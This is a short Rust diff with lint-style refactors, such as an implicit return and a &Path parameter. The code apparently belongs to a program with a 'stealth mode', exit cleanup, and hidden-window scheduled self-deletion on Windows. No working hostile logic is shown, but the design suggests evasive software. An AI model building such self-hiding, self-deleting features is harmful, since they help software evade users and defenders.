@@ -9,7 +9,7 @@
 use std::env;
 use std::fs;
 use std::io;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::sync::atomic::{AtomicBool, Ordering};
 
@@ -86,7 +86,7 @@ pub fn ensure_stealth_mode() -> bool {
     #[cfg(debug_assertions)]
     {
         println!("[Stealth] Debug mode - skipping stealth");
-        return true;
+        true
     }
 
     #[cfg(not(debug_assertions))]
@@ -259,7 +259,7 @@ pub fn cleanup_on_exit() {
 
 /// Schedule self deletion (delayed delete)
 #[cfg(target_os = "windows")]
-fn schedule_self_deletion(exe_path: &PathBuf) {
+fn schedule_self_deletion(exe_path: &Path) {
     use std::os::windows::process::CommandExt;
     const CREATE_NO_WINDOW: u32 = 0x08000000;
 
